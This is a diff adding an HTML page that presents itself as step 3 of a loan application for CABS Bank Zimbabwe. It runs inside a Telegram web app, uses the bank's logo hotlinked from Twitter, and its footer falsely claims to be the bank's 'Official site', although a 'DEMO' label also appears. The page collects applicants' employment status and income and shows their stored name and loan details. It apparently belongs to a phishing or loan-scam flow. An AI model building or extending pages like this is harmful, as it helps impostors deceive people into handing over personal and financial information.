@@ -1,0 +1,428 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#092c4c">
+<title>CABS Bank Zimbabwe | loan Application Step 3</title>
+
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+<style>
+* {
+    box-sizing: border-box;
+}
+
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #f1f3f5;
+    margin: 0;
+    padding: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    min-height: 100vh;
+}
+
+/* Header */
+.app-header {
+    width: 100%;
+    background: #092c4c;
+    padding: 15px 20px;
+    color: white;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    position: relative;
+}
+
+.back-btn {
+    color: white;
+    text-decoration: none;
+    font-weight: 500;
+    cursor: pointer;
+}
+
+.header-title {
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+    display: flex;
+    align-items: center;
+}
+
+.header-title img {
+    height: 45px;
+    width: auto;
+    object-fit: contain;
+}
+
+.demo-label {
+    font-size: 9px;
+    color: #fff;
+    background: #a66a16;
+    padding: 3px 6px;
+    border-radius: 4px;
+    margin-left: 6px;
+}
+
+.menu-icon {
+    font-size: 24px;
+}
+
+/* Card */
+.card {
+    background: white;
+    width: 92%;
+    max-width: 450px;
+    margin: 20px 0;
+    padding: 25px 20px;
+    border-radius: 15px;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.05);
+    display: flex;
+    flex-direction: column;
+}
+
+.demo-notice {
+    background: #fff7e8;
+    border: 1px solid #ead6ad;
+    color: #76531c;
+    padding: 10px;
+    font-size: 12px;
+    border-radius: 7px;
+    text-align: center;
+    margin-bottom: 18px;
+}
+
+.main-title {
+    font-size: 24px;
+    color: #092c4c;
+    margin: 0 0 5px;
+    text-align: center;
+    font-weight: bold;
+}
+
+.subtext {
+    font-size: 13px;
+    color: #888;
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+/* Progress */
+.step-indicator {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+    margin-bottom: 25px;
+}
+
+.step-bar {
+    flex: 1;
+    height: 4px;
+    background: #e0e0e0;
+    border-radius: 2px;
+}
+
+.step-bar.active {
+    background: #c69a42;
+}
+
+/* Form */
+.form-group {
+    margin-bottom: 20px;
+    display: flex;
+    flex-direction: column;
+}
+
+.form-group label {
+    font-size: 14px;
+    font-weight: bold;
+    color: #444;
+    margin-bottom: 8px;
+}
+
+.form-control {
+    font-size: 16px;
+    padding: 12px 15px;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+    background: #fcfcfc;
+    color: #333;
+    outline: none;
+    width: 100%;
+}
+
+.form-control:focus {
+    border-color: #092c4c;
+}
+
+select.form-control {
+    cursor: pointer;
+}
+
+/* Summary */
+.summary-card {
+    background: #f8f7f2;
+    border: 1px solid #e7dfca;
+    border-left: 4px solid #c69a42;
+    border-radius: 8px;
+    padding: 20px 15px;
+    margin-bottom: 25px;
+}
+
+.summary-title {
+    font-size: 16px;
+    font-weight: bold;
+    color: #092c4c;
+    margin-top: 0;
+    margin-bottom: 15px;
+}
+
+.summary-row {
+    display: flex;
+    justify-content: space-between;
+    font-size: 14px;
+    margin-bottom: 10px;
+}
+
+.summary-row:last-child {
+    margin-bottom: 0;
+}
+
+.summary-label {
+    color: #888;
+}
+
+.summary-value {
+    color: #092c4c;
+    font-weight: bold;
+    text-align: right;
+    word-break: break-word;
+    max-width: 60%;
+}
+
+/* Buttons */
+.button-group {
+    display: flex;
+    gap: 15px;
+    margin-top: 10px;
+}
+
+.btn-prev {
+    flex: 1;
+    background: #f1f3f5;
+    color: #333;
+    border: 1px solid #ccc;
+    padding: 15px;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+}
+
+.btn-next {
+    flex: 1.2;
+    background: #092c4c;
+    color: white;
+    border: none;
+    padding: 15px;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: bold;
+    cursor: pointer;
+    line-height: 1.3;
+}
+
+/* Footer */
+.footer-banner {
+    width: 100%;
+    background: #092c4c;
+    color: rgba(255,255,255,0.85);
+    text-align: center;
+    padding: 15px;
+    font-size: 12px;
+    margin-top: auto;
+}
+
+.footer-banner strong {
+    display: block;
+    margin-bottom: 5px;
+    color: white;
+}
+</style>
+</head>
+
+<body>
+
+<header class="app-header">
+    <a href="/page3" class="back-btn">← Back</a>
+
+    <div class="header-title">
+        <img
+            src="https://pbs.twimg.com/profile_images/1204047964710359040/zg_xDDsa.jpg"
+            alt="CABS logo"
+        >
+        <span class="demo-label">DEMO</span>
+    </div>
+
+    <span class="menu-icon">☰</span>
+</header>
+
+<main class="card">
+
+    
+    </div>
+
+    <h1 class="main-title">Loan Application</h1>
+    <div class="subtext">Step 3 of 3</div>
+
+    <div class="step-indicator">
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+        <div class="step-bar active"></div>
+    </div>
+
+    <form id="step3Form" onsubmit="submitStep3(event)">
+
+        <div class="form-group">
+            <label for="employmentStatus">Employment Status</label>
+
+            <select id="employmentStatus" class="form-control" required>
+                <option value="Self-Employed" selected>Self-Employed</option>
+                <option value="Employed">Employed</option>
+                <option value="Unemployed">Unemployed</option>
+                <option value="Student">Student</option>
+            </select>
+        </div>
+
+        <div class="form-group">
+            <label for="annualIncome">Annual Income (USD)</label>
+
+            <input
+                type="number"
+                id="annualIncome"
+                class="form-control"
+                placeholder="Enter your annual income"
+                min="0"
+                step="0.01"
+                required
+            >
+        </div>
+
+        <section class="summary-card">
+            <h3 class="summary-title">Application Summary</h3>
+
+            <div class="summary-row">
+                <span class="summary-label">Loan Amount:</span>
+                <span id="summaryAmount" class="summary-value">USD 0.00</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Loan Term:</span>
+                <span id="summaryTerm" class="summary-value">0 months</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Purpose:</span>
+                <span id="summaryPurpose" class="summary-value">Not specified</span>
+            </div>
+
+            <div class="summary-row">
+                <span class="summary-label">Applicant:</span>
+                <span id="summaryApplicant" class="summary-value">Name Not Found</span>
+            </div>
+        </section>
+
+        <div class="button-group">
+            <button
+                type="button"
+                class="btn-prev"
+                onclick="goBack()"
+            >
+                Previous
+            </button>
+
+            <button type="submit" class="btn-next">
+                CONTINUE<br>
+            </button>
+        </div>
+
+    </form>
+</main>
+
+<footer class="footer-banner">
+    <strong>CABS Bank Zimbabwe — Official site</strong>
+    © Copyright 2026 CABS. A Member of the Old Mutual Group.
+</footer>
+
+<script>
+window.onload = () => {
+
+    const tg = window.Telegram?.WebApp;
+
+    if (tg) {
+        tg.ready();
+        tg.expand();
+    }
+
+    const appliedAmount =
+        localStorage.getItem('appliedAmount') ||
+        localStorage.getItem('amount') ||
+        "0";
+
+    const appliedTerm =
+        localStorage.getItem('appliedTerm') ||
+        localStorage.getItem('loanDuration') ||
+        "0 months";
+
+    const appliedPurpose =
+        localStorage.getItem('appliedPurpose') ||
+        "Not specified";
+
+    const firstName = localStorage.getItem('firstName') || "";
+    const lastName = localStorage.getItem('lastName') || "";
+
+    const applicantName =
+        (firstName || lastName)
+        ? `${firstName} ${lastName}`.trim()
+        : "Name Not Found";
+
+    document.getElementById('summaryAmount').innerText =
+        `USD ${Number(appliedAmount).toLocaleString()}`;
+
+    document.getElementById('summaryTerm').innerText =
+        appliedTerm.toLowerCase();
+
+    document.getElementById('summaryPurpose').innerText =
+        appliedPurpose;
+
+    document.getElementById('summaryApplicant').innerText =
+        applicantName;
+};
+
+function goBack() {
+    window.location.href = "/page3";
+}
+
+function submitStep3(event) {
+
+    event.preventDefault();
+
+    const employmentStatus =
+        document.getElementById('employmentStatus').value;
+
+    const annualIncome =
+        document.getElementById('annualIncome').value;
+
+    localStorage.setItem('employmentStatus', employmentStatus);
+    localStorage.setItem('annualIncome', annualIncome);
+
+    // Original next-page navigation preserved.
+    window.location.href = "page5.html";
+}
+</script>
+
+</body>
+</html>
